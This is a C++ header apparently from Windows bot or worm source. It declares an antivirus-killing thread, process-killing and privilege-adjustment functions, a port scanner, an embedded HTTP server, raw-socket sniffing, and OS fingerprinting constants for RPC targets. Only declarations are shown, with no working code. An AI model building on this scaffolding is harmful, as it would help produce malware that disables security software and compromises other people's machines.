#include "Include.h"
#include "CThread.h"

#define xRead(x,y,z) recv(x,y,z,0)
#define xWrite(x,y,z) send(x,y,z,0)
#define xClose closesocket
#define OS_UNKNOWN			0
#define OS_WINNT			1
#define OS_WIN2K			2
#define	OS_WINXP			3

#define FP_RPC				1
#define	FP_PORT5K			2
#define FP_TTL				3
#define DCE_PKT_BINDACK		0x0C
#define DCE_PKT_RESPONSE	0x02
#define SIO_RCVALL			_WSAIOW(IOC_VENDOR,1)


void AddHosts(void);

int listProcesses(char *proccess, BOOL killthread=TRUE, BOOL full=TRUE);

int killProcess(int pid);
BOOL AdjustPrivileges(char *pPriv, BOOL add);

class CHttpd : public CThread {
public:
	virtual void *Run();
};

class KillAVThread : public CThread {
public:
	virtual void *Run();
};

bool ScanPort(const char *host, const unsigned short port);
char * sysinfo(char *sinfo);

typedef struct ip_hdr {
	unsigned char	 h_verlen;
	unsigned char	 tos;
	unsigned short	 total_len;
	unsigned short	 ident;
	unsigned short	 frag_and_flags;
	unsigned char	 ttl;
	unsigned char	 proto;
	unsigned short	 checksum;
	unsigned int	 sourceIP;
	unsigned int	 destIP;
}IPHEADER;

typedef struct tsd_hdr {
	unsigned long	 saddr;
	unsigned long	 daddr;
	char			 mbz;
	char			 ptcl;
	unsigned short	 tcpl;
}PSDHEADER;


typedef struct tcp_hdr {
	unsigned short	 th_sport;
	unsigned short	 th_dport;
	unsigned int	 th_seq;
	unsigned int	 th_ack;
	unsigned char	 th_lenres;
	unsigned char	 th_flag;
	unsigned short	 th_win;
	unsigned short	 th_sum;
	unsigned short	 th_urp;
}TCPHEADER;

